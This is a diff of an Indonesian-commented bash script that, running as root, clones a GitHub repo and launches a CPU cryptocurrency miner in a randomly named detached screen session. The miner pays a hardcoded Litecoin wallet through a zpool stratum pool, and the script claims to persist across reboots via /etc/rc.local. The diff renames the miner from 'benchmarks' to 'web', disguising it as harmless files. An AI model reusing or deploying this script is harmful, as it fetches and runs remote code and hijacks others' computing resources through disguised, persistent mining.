@@ -5,18 +5,18 @@ apt-get update && apt-get install -y screen wget tar
 # Membuat 5 huruf acak
 RAND=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << EOF > /root/benchmarks.sh
+echo "📁 Menyimpan skrip mining ke /root/web.sh..."
+cat << EOF > /root/web.sh
 #!/bin/bash
 
 cd /root || exit
 
 # Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
+if [ ! -f web ]; then
+  echo "⬇️ Mengunduh file web..."
   git clone https://github.com/amirul5656/yui56.git
   cd yui56
-  chmod +x benchmarks
+  chmod +x web
 fi
 
 # Cek apakah screen sudah berjalan
@@ -26,16 +26,16 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3-${RAND}'..."
   screen -dmS amirul3-${RAND} bash -c '
     while true; do
-      ./benchmarks --algorithm power2b --pool stratum+tcp://power2b.jp.mine.zpool.ca:6242 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5 -p c=LTC,${RAND} --cpu-threads 20
+      ./web -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5 -p c=LTC -t 20
       sleep 2
     done
   '
 fi
 EOF
 
-chmod +x /root/benchmarks.sh
+chmod +x /root/web.sh
 
 echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
+bash /root/web.sh
 
 echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
